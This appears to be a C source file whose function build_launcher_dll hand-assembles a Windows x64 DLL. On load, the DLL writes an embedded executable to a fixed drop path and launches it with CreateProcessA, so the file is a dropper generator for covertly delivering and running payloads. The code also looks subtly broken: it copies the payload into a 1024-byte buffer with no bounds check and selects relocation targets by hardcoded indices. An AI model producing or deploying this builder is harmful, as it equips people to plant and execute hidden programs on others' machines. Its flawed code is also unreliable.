#define _GNU_SOURCE
#include "config.h"

#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

struct rip_patch {
    size_t displacement_offset;
    size_t instruction_end;
    uint32_t target_rva;
};

struct branch_patch {
    size_t displacement_offset;
    size_t instruction_end;
    size_t target_offset;
};

static void put_u16(unsigned char *p, uint16_t value)
{
    p[0] = (unsigned char)value;
    p[1] = (unsigned char)(value >> 8);
}

static void put_u32(unsigned char *p, uint32_t value)
{
    p[0] = (unsigned char)value;
    p[1] = (unsigned char)(value >> 8);
    p[2] = (unsigned char)(value >> 16);
    p[3] = (unsigned char)(value >> 24);
}

static void put_u64(unsigned char *p, uint64_t value)
{
    put_u32(p, (uint32_t)value);
    put_u32(p + 4, (uint32_t)(value >> 32));
}

static size_t align_up_size(size_t value, size_t alignment)
{
    return (value + alignment - 1) & ~(alignment - 1);
}

static int read_binary_file(const char *path, unsigned char **data_out,
                            size_t *size_out)
{
    int fd = -1;
    struct stat st;
    unsigned char *data = NULL;
    size_t size;
    size_t done = 0;

    fd = open(path, O_RDONLY);
    if (fd < 0)
        return -1;
    if (fstat(fd, &st) < 0 || st.st_size < 0 ||
        (uint64_t)st.st_size > UINT32_MAX) {
        close(fd);
        errno = EFBIG;
        return -1;
    }

    size = (size_t)st.st_size;
    data = malloc(size == 0 ? 1 : size);
    if (data == NULL) {
        close(fd);
        return -1;
    }

    while (done < size) {
        ssize_t n = read(fd, data + done, size - done);
        if (n < 0) {
            if (errno == EINTR)
                continue;
            free(data);
            close(fd);
            return -1;
        }
        if (n == 0) {
            free(data);
            close(fd);
            errno = EIO;
            return -1;
        }
        done += (size_t)n;
    }

    if (close(fd) < 0) {
        free(data);
        return -1;
    }

    *data_out = data;
    *size_out = size;
    return 0;
}

static int write_all(int fd, const unsigned char *data, size_t size)
{
    size_t done = 0;

    while (done < size) {
        ssize_t n = write(fd, data + done, size - done);
        if (n < 0) {
            if (errno == EINTR)
                continue;
            return -1;
        }
        if (n == 0) {
            errno = EIO;
            return -1;
        }
        done += (size_t)n;
    }
    return 0;
}

int build_launcher_dll(const char *binary_path, const char *dll_out_path)
{
    static const char *function_names[4] = {
        "CreateFileA", "WriteFile", "CloseHandle", "CreateProcessA"
    };
    static const unsigned char reloc_block[8] = {
        0x00, 0x10, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00
    };
    unsigned char *binary = NULL;
    size_t binary_size = 0;
    unsigned char idata[512];
    size_t idata_size = 0;
    uint32_t name_rvas[4];
    uint32_t iat_rvas[4];
    size_t name_offsets[4];
    size_t cursor;
    const char *dll_name = "KERNEL32.dll";
    unsigned char code[1024];
    size_t code_size = 0;
    struct rip_patch rip_patches[16];
    size_t rip_count = 0;
    struct branch_patch branch_patches[8];
    size_t branch_count = 0;
    size_t branch_non_attach;
    size_t branch_skip_write_1;
    size_t branch_skip_write_2;
    size_t skip_write_offset;
    size_t epilogue_offset;
    size_t path_offset;
    size_t binary_offset;
    size_t text_size;
    size_t text_raw_size;
    size_t idata_raw_size;
    size_t reloc_raw_size;
    size_t idata_raw_offset;
    size_t reloc_raw_offset;
    size_t file_size;
    unsigned char *file = NULL;
    unsigned char *text;
    unsigned char *idata_section;
    unsigned char *reloc_section;
    uint32_t entry_rva = 0x1000;
    uint32_t path_rva;
    uint32_t binary_rva;
    int out_fd = -1;
    int result = -1;
    size_t i;

    if (binary_path == NULL || dll_out_path == NULL) {
        errno = EINVAL;
        return -1;
    }

    if (read_binary_file(binary_path, &binary, &binary_size) < 0)
        return -1;

    memset(idata, 0, sizeof(idata));
    cursor = 40 + 40 + 40;
    for (i = 0; i < 4; i++) {
        name_offsets[i] = cursor;
        put_u16(idata + cursor, 0);
        cursor += 2;
        memcpy(idata + cursor, function_names[i],
               strlen(function_names[i]) + 1);
        cursor += strlen(function_names[i]) + 1;
    }
    {
        size_t dll_offset = cursor;
        memcpy(idata + dll_offset, dll_name, strlen(dll_name) + 1);
        cursor += strlen(dll_name) + 1;

        put_u32(idata, 0x2000 + 40);
        put_u32(idata + 12, 0x2000 + (uint32_t)dll_offset);
        put_u32(idata + 16, 0x2000 + 80);
        for (i = 0; i < 4; i++) {
            uint32_t hint_name_rva = 0x2000 + (uint32_t)name_offsets[i];
            put_u64(idata + 40 + i * 8, hint_name_rva);
            put_u64(idata + 80 + i * 8, hint_name_rva);
            name_rvas[i] = hint_name_rva;
            iat_rvas[i] = 0x2000 + 80 + (uint32_t)i * 8;
        }
        idata_size = cursor;
    }

#define CODE_BYTE(v) do { code[code_size++] = (unsigned char)(v); } while (0)
#define CODE_U32(v) do { put_u32(code + code_size, (uint32_t)(v)); code_size += 4; } while (0)
#define ADD_RIP(target) do { \
    rip_patches[rip_count].displacement_offset = code_size; \
    code[code_size++] = 0; code[code_size++] = 0; \
    code[code_size++] = 0; code[code_size++] = 0; \
    rip_patches[rip_count].instruction_end = code_size; \
    rip_patches[rip_count].target_rva = (target); \
    rip_count++; \
} while (0)
#define ADD_BRANCH(op1, op2) do { \
    CODE_BYTE(op1); CODE_BYTE(op2); \
    branch_patches[branch_count].displacement_offset = code_size; \
    CODE_U32(0); \
    branch_patches[branch_count].instruction_end = code_size; \
    branch_patches[branch_count].target_offset = 0; \
    branch_count++; \
} while (0)

    CODE_BYTE(0x55);
    CODE_BYTE(0x48); CODE_BYTE(0x89); CODE_BYTE(0xe5);
    CODE_BYTE(0x48); CODE_BYTE(0x81); CODE_BYTE(0xec); CODE_U32(0x180);
    CODE_BYTE(0x83); CODE_BYTE(0xfa); CODE_BYTE(0x01);
    ADD_BRANCH(0x0f, 0x85);
    branch_non_attach = branch_count - 1;

    CODE_BYTE(0x48); CODE_BYTE(0x8d); CODE_BYTE(0x0d);
    ADD_RIP(0);
    CODE_BYTE(0xba); CODE_U32(0x40000000);
    CODE_BYTE(0x45); CODE_BYTE(0x31); CODE_BYTE(0xc0);
    CODE_BYTE(0x45); CODE_BYTE(0x31); CODE_BYTE(0xc9);
    CODE_BYTE(0xc7); CODE_BYTE(0x44); CODE_BYTE(0x24); CODE_BYTE(0x20); CODE_U32(2);
    CODE_BYTE(0xc7); CODE_BYTE(0x44); CODE_BYTE(0x24); CODE_BYTE(0x28); CODE_U32(0x80);
    CODE_BYTE(0x48); CODE_BYTE(0xc7); CODE_BYTE(0x44); CODE_BYTE(0x24); CODE_BYTE(0x30); CODE_U32(0);
    CODE_BYTE(0xff); CODE_BYTE(0x15);
    ADD_RIP(iat_rvas[0]);
    CODE_BYTE(0x48); CODE_BYTE(0x89); CODE_BYTE(0x85); CODE_U32((uint32_t)-8);
    CODE_BYTE(0x48); CODE_BYTE(0x83); CODE_BYTE(0xf8); CODE_BYTE(0xff);
    ADD_BRANCH(0x0f, 0x84);
    branch_skip_write_1 = branch_count - 1;
    CODE_BYTE(0x48); CODE_BYTE(0x85); CODE_BYTE(0xc0);
    ADD_BRANCH(0x0f, 0x84);
    branch_skip_write_2 = branch_count - 1;

    CODE_BYTE(0x48); CODE_BYTE(0x8b); CODE_BYTE(0x8d); CODE_U32((uint32_t)-8);
    CODE_BYTE(0x48); CODE_BYTE(0x8d); CODE_BYTE(0x15);
    ADD_RIP(0);
    CODE_BYTE(0x41); CODE_BYTE(0xb8); CODE_U32((uint32_t)binary_size);
    CODE_BYTE(0x4c); CODE_BYTE(0x8d); CODE_BYTE(0x8d); CODE_U32((uint32_t)-16);
    CODE_BYTE(0x48); CODE_BYTE(0xc7); CODE_BYTE(0x44); CODE_BYTE(0x24); CODE_BYTE(0x20); CODE_U32(0);
    CODE_BYTE(0xff); CODE_BYTE(0x15);
    ADD_RIP(iat_rvas[1]);

    CODE_BYTE(0x48); CODE_BYTE(0x8b); CODE_BYTE(0x8d); CODE_U32((uint32_t)-8);
    CODE_BYTE(0xff); CODE_BYTE(0x15);
    ADD_RIP(iat_rvas[2]);

    skip_write_offset = code_size;
    branch_patches[branch_skip_write_1].target_offset = skip_write_offset;
    branch_patches[branch_skip_write_2].target_offset = skip_write_offset;

    CODE_BYTE(0x48); CODE_BYTE(0x8d); CODE_BYTE(0x0d);
    ADD_RIP(0);
    CODE_BYTE(0x31); CODE_BYTE(0xd2);
    CODE_BYTE(0x45); CODE_BYTE(0x31); CODE_BYTE(0xc0);
    CODE_BYTE(0x45); CODE_BYTE(0x31); CODE_BYTE(0xc9);
    CODE_BYTE(0xc7); CODE_BYTE(0x44); CODE_BYTE(0x24); CODE_BYTE(0x20); CODE_U32(0);
    CODE_BYTE(0xc7); CODE_BYTE(0x44); CODE_BYTE(0x24); CODE_BYTE(0x28); CODE_U32(0);
    CODE_BYTE(0x48); CODE_BYTE(0xc7); CODE_BYTE(0x44); CODE_BYTE(0x24); CODE_BYTE(0x30); CODE_U32(0);
    CODE_BYTE(0x48); CODE_BYTE(0xc7); CODE_BYTE(0x44); CODE_BYTE(0x24); CODE_BYTE(0x38); CODE_U32(0);
    CODE_BYTE(0x48); CODE_BYTE(0x8d); CODE_BYTE(0x85); CODE_U32((uint32_t)-256);
    CODE_BYTE(0x48); CODE_BYTE(0x89); CODE_BYTE(0x44); CODE_BYTE(0x24); CODE_BYTE(0x40);
    CODE_BYTE(0x48); CODE_BYTE(0x8d); CODE_BYTE(0x85); CODE_U32((uint32_t)-288);
    CODE_BYTE(0x48); CODE_BYTE(0x89); CODE_BYTE(0x44); CODE_BYTE(0x24); CODE_BYTE(0x48);

    for (i = 0; i < 13; i++) {
        CODE_BYTE(0x48); CODE_BYTE(0xc7); CODE_BYTE(0x85);
        CODE_U32((uint32_t)(-(int32_t)256 + (int32_t)(i * 8)));
        CODE_U32(0);
    }
    for (i = 0; i < 3; i++) {
        CODE_BYTE(0x48); CODE_BYTE(0xc7); CODE_BYTE(0x85);
        CODE_U32((uint32_t)(-(int32_t)288 + (int32_t)(i * 8)));
        CODE_U32(0);
    }
    CODE_BYTE(0xc7); CODE_BYTE(0x85); CODE_U32((uint32_t)-256); CODE_U32(104);

    CODE_BYTE(0x48); CODE_BYTE(0x8d); CODE_BYTE(0x0d);
    ADD_RIP(0);
    CODE_BYTE(0x31); CODE_BYTE(0xd2);
    CODE_BYTE(0x45); CODE_BYTE(0x31); CODE_BYTE(0xc0);
    CODE_BYTE(0x45); CODE_BYTE(0x31); CODE_BYTE(0xc9);
    CODE_BYTE(0xc7); CODE_BYTE(0x44); CODE_BYTE(0x24); CODE_BYTE(0x20); CODE_U32(0);
    CODE_BYTE(0xc7); CODE_BYTE(0x44); CODE_BYTE(0x24); CODE_BYTE(0x28); CODE_U32(0);
    CODE_BYTE(0x48); CODE_BYTE(0xc7); CODE_BYTE(0x44); CODE_BYTE(0x24); CODE_BYTE(0x30); CODE_U32(0);
    CODE_BYTE(0x48); CODE_BYTE(0xc7); CODE_BYTE(0x44); CODE_BYTE(0x24); CODE_BYTE(0x38); CODE_U32(0);
    CODE_BYTE(0x48); CODE_BYTE(0x8d); CODE_BYTE(0x85); CODE_U32((uint32_t)-256);
    CODE_BYTE(0x48); CODE_BYTE(0x89); CODE_BYTE(0x44); CODE_BYTE(0x24); CODE_BYTE(0x40);
    CODE_BYTE(0x48); CODE_BYTE(0x8d); CODE_BYTE(0x85); CODE_U32((uint32_t)-288);
    CODE_BYTE(0x48); CODE_BYTE(0x89); CODE_BYTE(0x44); CODE_BYTE(0x24); CODE_BYTE(0x48);
    CODE_BYTE(0xff); CODE_BYTE(0x15);
    ADD_RIP(iat_rvas[3]);

    epilogue_offset = code_size;
    branch_patches[branch_non_attach].target_offset = epilogue_offset;
    CODE_BYTE(0xb8); CODE_U32(1);
    CODE_BYTE(0xc9);
    CODE_BYTE(0xc3);

    path_offset = code_size;
    if (strlen(DROP_PATH) + 1 > SIZE_MAX - path_offset) {
        errno = EFBIG;
        goto cleanup;
    }
    code_size += strlen(DROP_PATH) + 1;
    binary_offset = code_size;
    if (binary_size > SIZE_MAX - code_size) {
        errno = EFBIG;
        goto cleanup;
    }
    code_size += binary_size;
    if (code_size > UINT32_MAX) {
        errno = EFBIG;
        goto cleanup;
    }
    if (binary_size != 0)
        memcpy(code + binary_offset, binary, binary_size);
    memcpy(code + path_offset, DROP_PATH, strlen(DROP_PATH) + 1);

    path_rva = 0x1000 + (uint32_t)path_offset;
    binary_rva = 0x1000 + (uint32_t)binary_offset;
    for (i = 0; i < rip_count; i++) {
        uint32_t target = rip_patches[i].target_rva;
        int64_t relative;
        if (target == 0) {
            size_t ref_index = 0;
            for (ref_index = 0; ref_index < rip_count; ref_index++) {
                if (ref_index == i)
                    break;
            }
            if (i == 0 || i == 5 || i == 10 || i == 19)
                target = path_rva;
            else
                target = binary_rva;
        }
        relative = (int64_t)target -
                   (int64_t)(0x1000 + rip_patches[i].instruction_end);
        put_u32(code + rip_patches[i].displacement_offset,
                (uint32_t)(int32_t)relative);
    }

    for (i = 0; i < branch_count; i++) {
        int64_t relative = (int64_t)branch_patches[i].target_offset -
                           (int64_t)branch_patches[i].instruction_end;
        put_u32(code + branch_patches[i].displacement_offset,
                (uint32_t)(int32_t)relative);
    }

    text_size = code_size;
    text_raw_size = align_up_size(text_size, 0x200);
    idata_raw_size = align_up_size(idata_size, 0x200);
    reloc_raw_size = 0x200;
    idata_raw_offset = 0x200 + text_raw_size;
    reloc_raw_offset = idata_raw_offset + idata_raw_size;
    file_size = reloc_raw_offset + reloc_raw_size;

    file = calloc(1, file_size);
    if (file == NULL)
        goto cleanup;

    put_u16(file, 0x5a4d);
    put_u32(file + 0x3c, 0x80);
    memcpy(file + 0x80, "PE\0\0", 4);

    put_u16(file + 0x84, 0x8664);
    put_u16(file + 0x86, 3);
    put_u32(file + 0x88, 0);
    put_u32(file + 0x8c, 0);
    put_u32(file + 0x90, 0);
    put_u16(file + 0x94, 240);
    put_u16(file + 0x96, 0x2022);

    {
        unsigned char *opt = file + 0x98;
        put_u16(opt, 0x20b);
        opt[2] = 14;
        put_u32(opt + 4, (uint32_t)text_raw_size);
        put_u32(opt + 8, (uint32_t)(idata_raw_size + reloc_raw_size));
        put_u32(opt + 16, entry_rva);
        put_u32(opt + 20, 0x1000);
        put_u64(opt + 24, UINT64_C(0x180000000));
        put_u32(opt + 32, 0x1000);
        put_u32(opt + 36, 0x200);
        put_u16(opt + 40, 6);
        put_u16(opt + 42, 0);
        put_u16(opt + 48, 6);
        put_u16(opt + 50, 0);
        put_u32(opt + 56, 0x4000);
        put_u32(opt + 60, 0x200);
        put_u16(opt + 68, 2);
        put_u16(opt + 70, 0x8160);
        put_u64(opt + 72, UINT64_C(0x100000));
        put_u64(opt + 80, UINT64_C(0x1000));
        put_u64(opt + 88, UINT64_C(0x100000));
        put_u64(opt + 96, UINT64_C(0x1000));
        put_u32(opt + 108, 16);
        put_u32(opt + 112 + 1 * 8, 0x2000);
        put_u32(opt + 112 + 1 * 8 + 4, 40);
        put_u32(opt + 112 + 5 * 8, 0x3000);
        put_u32(opt + 112 + 5 * 8 + 4, 8);
    }

    {
        unsigned char *sections = file + 0x188;
        unsigned char *s = sections;

        memcpy(s, ".text", 5);
        put_u32(s + 8, (uint32_t)text_size);
        put_u32(s + 12, 0x1000);
        put_u32(s + 16, (uint32_t)text_raw_size);
        put_u32(s + 20, 0x200);
        put_u32(s + 36, 0xe0000020);

        s += 40;
        memcpy(s, ".idata", 6);
        put_u32(s + 8, (uint32_t)idata_size);
        put_u32(s + 12, 0x2000);
        put_u32(s + 16, (uint32_t)idata_raw_size);
        put_u32(s + 20, (uint32_t)idata_raw_offset);
        put_u32(s + 36, 0xc0000040);

        s += 40;
        memcpy(s, ".reloc", 6);
        put_u32(s + 8, 8);
        put_u32(s + 12, 0x3000);
        put_u32(s + 16, (uint32_t)reloc_raw_size);
        put_u32(s + 20, (uint32_t)reloc_raw_offset);
        put_u32(s + 36, 0x42000040);
    }

    text = file + 0x200;
    memcpy(text, code, code_size);
    idata_section = file + idata_raw_offset;
    memcpy(idata_section, idata, idata_size);
    reloc_section = file + reloc_raw_offset;
    memcpy(reloc_section, reloc_block, sizeof(reloc_block));

    out_fd = open(dll_out_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (out_fd < 0)
        goto cleanup;
    if (write_all(out_fd, file, file_size) < 0)
        goto cleanup;
    if (close(out_fd) < 0) {
        out_fd = -1;
        goto cleanup;
    }
    out_fd = -1;
    result = 0;

cleanup:
    if (out_fd >= 0)
        close(out_fd);
    free(file);
    free(binary);
    return result;

#undef CODE_BYTE
#undef CODE_U32
#undef ADD_RIP
#undef ADD_BRANCH
}